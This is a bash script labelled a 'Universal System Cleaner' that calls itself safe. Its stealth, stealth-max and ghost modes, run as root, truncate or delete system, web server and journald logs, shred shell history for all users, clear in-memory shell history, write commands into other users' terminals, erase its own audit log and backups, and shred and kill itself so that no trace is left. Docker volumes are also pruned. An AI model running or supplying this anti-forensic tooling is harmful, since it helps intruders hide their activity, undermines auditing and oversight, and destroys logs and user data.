#!/usr/bin/env bash
#
# ================================================================
#  Universal System Cleaner — Production / Stealth / Maximum
#  Version: 1.1.0
#  Description: Safe system files and caches cleanup
# ================================================================
#  Modes:
#    --dry-run      - Test run without changes
#    --stealth      - Minimal output, basic cleanup
#    --stealth-max  - Full cleanup with cache erasure
#    --ghost        - Complete trace removal (self-cleanup)
#    --help         - Show help
#
#  Features:
#    - Critical directories protection
#    - Script self-cleanup (ghost mode)
#    - Audit with deletion capability
# ================================================================

set -euo pipefail
IFS=$'\n\t'

# -----------------------------
# Configuration
# -----------------------------
STEALTH=0
STEALTH_MAX=0
DRY_RUN=0
BACKUP_ENABLED=0
GHOST_MODE=0
SCRIPT_NAME=$(basename "$0")
SCRIPT_PATH=$(realpath "$0")
AUDIT_LOG="/var/log/system-cleaner-audit.log"
BACKUP_DIR="/var/backups/system-cleaner"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
SESSION_ID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || date +%s)

# Protected directories (never clean)
PROTECTED_PATHS=(
    "/proc"
    "/sys"
    "/dev"
    "/boot"
    "/etc"
    "/root/.ssh"
    "/home/*/.ssh"
    "/var/lib"
    "/usr"
    "/opt"
    "/srv"
    "/var/lib/docker"
    "/var/lib/mysql"
    "/var/lib/postgresql"
)

# Files to keep (exceptions)
KEEP_FILES=(
    "/var/log/btmp"
    "/var/log/wtmp"
    "/var/log/lastlog"
    "/var/log/faillog"
)

# -----------------------------
# Functions
# -----------------------------
show_help() {
    cat << EOF
Usage: $0 [OPTIONS]

Options:
    --dry-run         Test run without making changes
    --stealth         Minimal output, basic cleanup
    --stealth-max     Full cleanup (including package caches, temp files)
    --ghost           Complete trace removal (including script logs)
    --backup          Create backup before cleanup
    --help            Show this help message

Examples:
    $0 --dry-run              # Test run
    $0 --stealth              # Basic cleanup
    $0 --stealth-max          # Full cleanup
    $0 --ghost                # Complete cleanup without traces
    $0 --ghost --stealth-max  # Maximum cleanup without traces
EOF
    exit 0
}

log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Don't write to files in ghost mode
    if [[ $GHOST_MODE -eq 0 ]]; then
        echo "[$timestamp] [$level] $message" >> "$AUDIT_LOG"
    fi
    
    # Console output depending on mode
    if [[ $STEALTH -eq 0 ]]; then
        case "$level" in
            "INFO") echo "[ℹ] $message" ;;
            "WARNING") echo "[⚠] $message" >&2 ;;
            "ERROR") echo "[✗] $message" >&2 ;;
            "SUCCESS") echo "[✓] $message" ;;
            *) echo "[?] $message" ;;
        esac
    elif [[ "$level" == "ERROR" ]]; then
        echo "[✗] $message" >&2
    fi
}

run() {
    local cmd="$1"
    
    if [[ $DRY_RUN -eq 1 ]]; then
        log "INFO" "[TEST] $cmd"
        return 0
    fi
    
    # Suppress output in ghost mode
    if [[ $GHOST_MODE -eq 1 ]]; then
        if eval "$cmd" >/dev/null 2>&1; then
            return 0
        else
            return $?
        fi
    fi
    
    # Normal execution
    if eval "$cmd" >/dev/null 2>&1; then
        log "INFO" "Executed: $cmd"
        return 0
    else
        local exit_code=$?
        log "WARNING" "Command failed with exit code $exit_code: $cmd"
        return $exit_code
    fi
}

is_protected() {
    local path="$1"
    
    for protected in "${PROTECTED_PATHS[@]}"; do
        if [[ "$path" == $protected ]] || [[ "$path" == $protected/* ]]; then
            return 0  # Protected path
        fi
    done
    
    for keep in "${KEEP_FILES[@]}"; do
        if [[ "$path" == "$keep" ]]; then
            return 0  # Exception from cleanup
        fi
    done
    
    return 1  # Not protected
}

create_backup() {
    [[ $GHOST_MODE -eq 1 ]] && return 0
    
    local backup_path="$BACKUP_DIR/$TIMESTAMP"
    
    log "INFO" "Creating backup at: $backup_path"
    mkdir -p "$backup_path"
    
    # Copying important logs
    cp -r /var/log/*.log "$backup_path/" 2>/dev/null || true
    cp -r /var/log/apt "$backup_path/apt" 2>/dev/null || true
    cp -r /var/log/apache2 "$backup_path/apache2" 2>/dev/null || true
    cp -r /var/log/nginx "$backup_path/nginx" 2>/dev/null || true
    
    # Command history
    cp -r /root/.bash_history "$backup_path/root_bash_history" 2>/dev/null || true
    cp -r /root/.zsh_history "$backup_path/root_zsh_history" 2>/dev/null || true
    
    # Create manifest
    find "$backup_path" -type f > "$backup_path/manifest.txt" 2>/dev/null
    log "SUCCESS" "Backup created successfully"
}

check_disk_space() {
    local threshold=95
    local usage=$(df / --output=pcent | tail -1 | tr -d '% ')
    
    if [[ $usage -gt $threshold ]]; then
        log "WARNING" "Disk usage: ${usage}% - manual cleanup recommended"
        return 1
    fi
    return 0
}

clean_logs() {
    log "INFO" "Cleaning system logs..."
    
    # Safe log cleaning
    find /var/log -type f -name '*.log' 2>/dev/null | while read -r logfile; do
        if ! is_protected "$logfile"; then
            run "truncate -s 0 '$logfile'"
        fi
    done
    
    # Remove old log archives
    run "find /var/log -type f \( -name '*.gz' -o -name '*.old' -o -name '*.1' -o -name '*.bz2' -o -name '*.xz' \) -delete"
    
    # Web servers
    [[ -d /var/log/apache2 ]] && find /var/log/apache2 -type f ! -name '*.keep' -exec truncate -s 0 {} \;
    [[ -d /var/log/httpd ]] && find /var/log/httpd -type f ! -name '*.keep' -exec truncate -s 0 {} \;
    [[ -d /var/log/nginx ]] && find /var/log/nginx -type f ! -name '*.keep' -exec truncate -s 0 {} \;
    
    # Package manager logs
    run "find /var/log/apt -type f -name '*.log' -exec truncate -s 0 {} \;"
    run "truncate -s 0 /var/log/dpkg.log 2>/dev/null || true"
    
    # Remove script logs (if exist)
    if [[ $GHOST_MODE -eq 1 ]]; then
        run "rm -f /var/log/system-cleaner*.log 2>/dev/null"
        run "rm -f /tmp/system-cleaner*.log 2>/dev/null"
    fi
}

clean_temp() {
    log "INFO" "Cleaning temporary files..."
    
    if [[ $STEALTH_MAX -eq 1 ]] || [[ $GHOST_MODE -eq 1 ]]; then
        # Safe cleanup of temporary directories
        for tmp_dir in /tmp /var/tmp /dev/shm; do
            if [[ -d "$tmp_dir" ]]; then
                # Remove files older than 1 day
                run "find '$tmp_dir' -type f -atime +1 ! -name '.*' -delete 2>/dev/null || true"
                # Remove empty directories
                run "find '$tmp_dir' -mindepth 1 -type d -empty -delete 2>/dev/null || true"
            fi
        done
        
        # Additional cleanup in ghost mode
        if [[ $GHOST_MODE -eq 1 ]]; then
            run "rm -rf /tmp/.X*-lock 2>/dev/null"
            run "rm -rf /tmp/.ICE-unix 2>/dev/null"
            run "rm -rf /tmp/.Test-unix 2>/dev/null"
            run "rm -rf /tmp/.X11-unix 2>/dev/null"
            run "find /tmp -type s -delete 2>/dev/null"
        fi
    fi
}

# Function for Zsh history synchronization
sync_zsh_history() {
    local home_dir="$1"
    local user=$(basename "$home_dir")
    
    # If history file doesn't exist, create empty one with correct permissions
    if [[ ! -f "$home_dir/.zsh_history" ]] && [[ ! -f "$home_dir/.zhistory" ]]; then
        run "touch '$home_dir/.zsh_history'"
        run "chown $user:$user '$home_dir/.zsh_history' 2>/dev/null || true"
    fi
    
    # Get PIDs of active Zsh sessions for user
    local zsh_pids=$(ps -u "$user" -o pid=,comm= 2>/dev/null | grep -w zsh | awk '{print $1}' || true)
    
    # If there are active Zsh sessions, sync history
    if [[ -n "$zsh_pids" ]]; then
        for pid in $zsh_pids; do
            # Send signal for forced history writing
            kill -SIGUSR1 "$pid" 2>/dev/null || true
            
            # Force Zsh to save history to file
            if [[ -d "/proc/$pid" ]]; then
                # Send 'fc -W' command via terminal
                local tty=$(readlink /proc/$pid/fd/0 2>/dev/null | grep -E '^/dev/pts/[0-9]+' || true)
                if [[ -n "$tty" ]] && [[ -w "$tty" ]]; then
                    echo "fc -W" > "$tty" 2>/dev/null || true
                fi
            fi
        done
        
        # Give time for synchronization
        sleep 0.5
    else
        # If no active sessions, force file update
        if [[ -f "$home_dir/.zsh_history" ]]; then
            # Create temporary file with last 10 commands (to preserve functionality)
            local temp_file=$(mktemp)
            if [[ -s "$home_dir/.zsh_history" ]]; then
                tail -10 "$home_dir/.zsh_history" > "$temp_file" 2>/dev/null || true
            else
                echo "# Empty history" > "$temp_file"
            fi
            mv "$temp_file" "$home_dir/.zsh_history" 2>/dev/null || true
            chown $user:$user "$home_dir/.zsh_history" 2>/dev/null || true
        fi
    fi
}

clean_user_data() {
    local home_dir="$1"
    local user=$(basename "$home_dir")
    
    # Bash history
    if [[ -f "$home_dir/.bash_history" ]]; then
        if [[ $GHOST_MODE -eq 1 ]]; then
            # In ghost mode: overwrite with zeros and delete
            run "shred -u -z -n 3 '$home_dir/.bash_history' 2>/dev/null || rm -f '$home_dir/.bash_history'"
        elif [[ $STEALTH -eq 1 ]] || [[ $STEALTH_MAX -eq 1 ]]; then
            # In stealth mode: clear file but keep its existence
            run "echo '' > '$home_dir/.bash_history'"
            run "chown $user:$user '$home_dir/.bash_history' 2>/dev/null || true"
        else
            # In normal mode: keep last 50 lines
            if [[ -s "$home_dir/.bash_history" ]]; then
                tail -50 "$home_dir/.bash_history" > "$home_dir/.bash_history.tmp" 2>/dev/null && \
                mv "$home_dir/.bash_history.tmp" "$home_dir/.bash_history" 2>/dev/null || true
            fi
        fi
    fi
    
    # Zsh history - SAFE CLEANUP
    local zsh_history_files=("$home_dir/.zsh_history" "$home_dir/.zhistory")
    
    for hist_file in "${zsh_history_files[@]}"; do
        if [[ -f "$hist_file" ]]; then
            if [[ $GHOST_MODE -eq 1 ]]; then
                # ONLY in ghost mode - complete deletion
                # First force history save
                if command -v fc &>/dev/null; then
                    run "fc -W" 2>/dev/null || true
                fi
                # Wait for synchronization
                sleep 0.2
                run "shred -u -z -n 3 '$hist_file' 2>/dev/null || rm -f '$hist_file'"
            elif [[ $STEALTH_MAX -eq 1 ]]; then
                # In stealth-max: keep last 1000 commands (normal history)
                if [[ -s "$hist_file" ]]; then
                    # Safe history preservation
                    local temp_hist=$(mktemp)
                    # For Zsh history keep last entries
                    if command -v tail &>/dev/null; then
                        tail -n 1000 "$hist_file" > "$temp_hist" 2>/dev/null || true
                    else
                        # Just clear if tail is unavailable
                        echo "" > "$temp_hist"
                    fi
                    mv "$temp_hist" "$hist_file" 2>/dev/null || true
                    chown "$user:$user" "$hist_file" 2>/dev/null || true
                fi
            else
                # In normal mode: leave history as is or minimal cleanup
                # Just remove old duplicates if needed
                # But mainly - DO NOT TOUCH history file
                true  # Do nothing
            fi
        fi
    done
    
    # Application caches
    run "rm -rf '$home_dir/.cache/thumbnails/fail'"
    run "rm -rf '$home_dir/.cache/thumbnails/normal'"
    run "rm -rf '$home_dir/.cache/gvfs'"
    
    # Browser caches
    run "rm -rf '$home_dir/.cache/google-chrome/Default/Cache'"
    run "rm -rf '$home_dir/.cache/chromium/Default/Cache'"
    run "rm -rf '$home_dir/.cache/mozilla/firefox'/*/cache2"
    
    # VS Code
    run "rm -rf '$home_dir/.config/Code/Cache'"
    run "rm -rf '$home_dir/.config/Code/CachedData'"
    run "rm -rf '$home_dir/.config/Code/logs'"
    run "rm -rf '$home_dir/.vscode/extensions/.obsolete'"
    
    # LibreOffice
    run "rm -rf '$home_dir/.cache/libreoffice'"
    run "rm -rf '$home_dir/.config/libreoffice'/*/cache"
    
    # Recent files
    run "rm -f '$home_dir/.local/share/recently-used.xbel'"
    run "rm -f '$home_dir/.config/gtk-3.0/bookmarks'"
    
    # Trash
    run "rm -rf '$home_dir/.local/share/Trash/files'/*"
    run "rm -rf '$home_dir/.local/share/Trash/info'/*"
    
    # Additional cleanup in ghost mode
    if [[ $GHOST_MODE -eq 1 ]]; then
        # Application temporary files
        run "find '$home_dir' -type f -name '*.tmp' -delete 2>/dev/null"
        run "find '$home_dir' -type f -name '*.temp' -delete 2>/dev/null"
        run "find '$home_dir' -type f -name '*.swp' -delete 2>/dev/null"
        run "find '$home_dir' -type f -name '*.swo' -delete 2>/dev/null"
        run "find '$home_dir' -type f -name '.DS_Store' -delete 2>/dev/null"
        
        # Application logs in home directory
        run "find '$home_dir' -type f -name '*.log' -delete 2>/dev/null"
    fi
}

self_cleanup() {
    log "INFO" "Script self-cleanup..."
    
    # Remove audit log
    if [[ -f "$AUDIT_LOG" ]]; then
        run "shred -u -z -n 3 '$AUDIT_LOG' 2>/dev/null || rm -f '$AUDIT_LOG'"
    fi
    
    # Remove backup copies (if created in this session)
    if [[ -d "$BACKUP_DIR/$TIMESTAMP" ]]; then
        run "rm -rf '$BACKUP_DIR/$TIMESTAMP'"
    fi
    
    # Clear command history of current shell
    if [[ $DRY_RUN -eq 0 ]]; then
        history -c 2>/dev/null || true
        history -w 2>/dev/null || true
        # Clear history in memory for all active sessions
        run "killall -HUP bash 2>/dev/null || true"
        run "killall -HUP zsh 2>/dev/null || true"
    fi
    
    # Remove script temporary files
    run "find /tmp -name '*system-cleaner*' -delete 2>/dev/null"
    run "find /var/tmp -name '*system-cleaner*' -delete 2>/dev/null"
    
    # Overwrite free space (optional, for enhanced stealth)
    if [[ $STEALTH_MAX -eq 1 ]] && command -v dd >/dev/null 2>&1; then
        log "INFO" "Overwriting free space..."
        run "dd if=/dev/zero of=/tmp/zero bs=1M count=100 2>/dev/null; rm -f /tmp/zero"
    fi
}

# -----------------------------
# Argument parsing
# -----------------------------
for arg in "$@"; do
    case "$arg" in
        --stealth) STEALTH=1 ;;
        --stealth-max) STEALTH=1; STEALTH_MAX=1 ;;
        --dry-run) DRY_RUN=1 ;;
        --ghost) GHOST_MODE=1; STEALTH=1 ;;
        --backup) [[ $GHOST_MODE -eq 0 ]] && BACKUP_ENABLED=1 ;;
        --help|-\?) show_help ;;
        *)
            echo "[✗] Unknown option: $arg" >&2
            show_help
            exit 1
            ;;
    esac
done

# In ghost mode automatically enable stealth-max
[[ $GHOST_MODE -eq 1 ]] && STEALTH_MAX=1

# -----------------------------
# Initialization
# -----------------------------
if [[ $STEALTH -eq 0 ]]; then
    echo "================================================"
    echo "  Universal System Cleaner v1.1.0"
    echo "  Mode: $(
        if [[ $GHOST_MODE -eq 1 ]]; then
            echo "GHOST";
        elif [[ $DRY_RUN -eq 1 ]]; then
            echo "TEST";
        elif [[ $STEALTH_MAX -eq 1 ]]; then
            echo "STEALTH-MAX";
        elif [[ $STEALTH -eq 1 ]]; then
            echo "STEALTH";
        else
            echo "STANDARD";
        fi
    )"
    echo "  Time: $TIMESTAMP"
    echo "  Session ID: $SESSION_ID"
    echo "================================================"
fi

# -----------------------------
# Pre-flight checks
# -----------------------------
if [[ $EUID -ne 0 ]]; then
    echo "[✗] Root privileges required" >&2
    exit 1
fi

# Check disk space (except ghost mode)
if [[ $GHOST_MODE -eq 0 ]]; then
    check_disk_space
fi

# Create backup (except ghost mode)
if [[ $BACKUP_ENABLED -eq 1 ]]; then
    create_backup
fi

# -----------------------------
# Detect systemd
# -----------------------------
SYSTEMD=0
if command -v systemctl >/dev/null 2>&1 && [[ -d /run/systemd/system ]]; then
    SYSTEMD=1
fi

# -----------------------------
# Clean journald
# -----------------------------
if [[ $SYSTEMD -eq 1 ]]; then
    log "INFO" "Cleaning systemd journals..."
    run "journalctl --rotate"
    run "journalctl --vacuum-time=1s"
    run "journalctl --vacuum-size=1M"
    
    if [[ $STEALTH_MAX -eq 1 ]] || [[ $GHOST_MODE -eq 1 ]]; then
        run "rm -rf /var/log/journal/*"
        run "rm -rf /run/log/journal/*"
    fi
fi

# -----------------------------
# Clean system logs
# -----------------------------
clean_logs

# -----------------------------
# Clean temporary files
# -----------------------------
clean_temp

# -----------------------------
# Clean package manager caches
# -----------------------------
log "INFO" "Cleaning package manager caches..."

# APT (Debian/Ubuntu)
if command -v apt >/dev/null 2>&1; then
    run "apt clean"
    run "apt autoclean"
    [[ $STEALTH_MAX -eq 1 ]] && run "rm -rf /var/lib/apt/lists/*"
fi

# Snap
if [[ -d /var/lib/snapd ]]; then
    run "rm -rf /var/lib/snapd/cache/*"
    run "rm -rf /var/cache/snapd/*"
fi

# DNF (RHEL/Fedora)
if command -v dnf >/dev/null 2>&1; then
    [[ $STEALTH_MAX -eq 1 ]] && run "dnf clean all"
fi

# Pacman (Arch)
if command -v pacman >/dev/null 2>&1; then
    [[ $STEALTH_MAX -eq 1 ]] && run "pacman -Scc --noconfirm"
fi

# Flatpak
if command -v flatpak >/dev/null 2>&1; then
    run "flatpak uninstall --unused -y 2>/dev/null || true"
fi

# -----------------------------
# Clean user data
# -----------------------------
log "INFO" "Cleaning user data..."
for HOME_DIR in /home/*; do
    [[ ! -d "$HOME_DIR" ]] && continue
    
    log "INFO" "Processing: $HOME_DIR"
    clean_user_data "$HOME_DIR"
done

# -----------------------------
# Clean root data
# -----------------------------
log "INFO" "Cleaning root data..."
clean_user_data "/root"

# -----------------------------
# Clean Docker
# -----------------------------
if command -v docker >/dev/null 2>&1; then
    if [[ $STEALTH_MAX -eq 1 ]] || [[ $GHOST_MODE -eq 1 ]]; then
        log "INFO" "Cleaning Docker..."
        run "docker system prune -af --volumes 2>/dev/null || true"
        run "docker builder prune -af 2>/dev/null || true"
    fi
fi

# -----------------------------
# Memory cleanup
# -----------------------------
if [[ $STEALTH_MAX -eq 1 ]] && [[ $DRY_RUN -eq 0 ]]; then
    log "INFO" "Optimizing memory..."
    run "sync"
    run "echo 1 > /proc/sys/vm/drop_caches 2>/dev/null || true"
fi

# -----------------------------
# Clean command history in memory
# -----------------------------
if [[ $STEALTH -eq 1 && $DRY_RUN -eq 0 ]]; then
    history -c 2>/dev/null || true
    history -w 2>/dev/null || true
fi

# -----------------------------
# Restart services
# -----------------------------
if [[ $SYSTEMD -eq 1 ]]; then
    run "systemctl restart systemd-journald 2>/dev/null || true"
    
    # Restart logging services
    run "systemctl restart rsyslog 2>/dev/null || true"
    run "systemctl restart syslog-ng 2>/dev/null || true"
fi

# -----------------------------
# Final Zsh synchronization for all users
# -----------------------------
if [[ $GHOST_MODE -eq 0 ]]; then
    log "INFO" "Synchronizing Zsh history..."
    
    # Sync for all users
    for HOME_DIR in /home/* /root; do
        [[ ! -d "$HOME_DIR" ]] && continue
        
        # Sync only if there are active Zsh sessions
        local user=$(basename "$HOME_DIR")
        if ps -u "$user" -o comm= 2>/dev/null | grep -q zsh; then
            sync_zsh_history "$HOME_DIR"
        fi
    done
fi

# -----------------------------
# Self-cleanup (ghost mode)
# -----------------------------
if [[ $GHOST_MODE -eq 1 ]]; then
    self_cleanup
    
    # Remove script after execution (optional)
    if [[ $DRY_RUN -eq 0 ]] && [[ -f "$SCRIPT_PATH" ]]; then
        run "shred -u -z -n 3 '$SCRIPT_PATH' 2>/dev/null || rm -f '$SCRIPT_PATH'"
    fi
fi

# -----------------------------
# Completion
# -----------------------------
# Update audit log permissions (if it exists)
if [[ -f "$AUDIT_LOG" ]] && [[ $GHOST_MODE -eq 0 ]]; then
    chmod 600 "$AUDIT_LOG" 2>/dev/null || true
fi

# Execution report
if [[ $STEALTH -eq 0 ]]; then
    if [[ $GHOST_MODE -eq 1 ]]; then
        echo "[✓] Cleanup completed. All traces removed."
    else
        log "SUCCESS" "Cleanup completed successfully"
        log "INFO" "Audit log: $AUDIT_LOG"
        
        if [[ $BACKUP_ENABLED -eq 1 ]]; then
            log "INFO" "Backup: $BACKUP_DIR/$TIMESTAMP"
        fi
        
        # Show freed space
        if [[ $DRY_RUN -eq 0 ]] && command -v df >/dev/null 2>&1; then
            current_usage=$(df / --output=pcent | tail -1 | tr -d '% ')
            log "INFO" "Current disk usage: ${current_usage}%"
        fi
    fi
else
    if [[ $GHOST_MODE -eq 0 ]]; then
        log "INFO" "Operation completed"
    fi
fi

# In ghost mode don't leave exit code 0 in history
if [[ $GHOST_MODE -eq 1 ]]; then
    # Terminate process to not leave traces in bash history
    kill -9 $$ 2>/dev/null || exit 0
else
    exit 0
fi
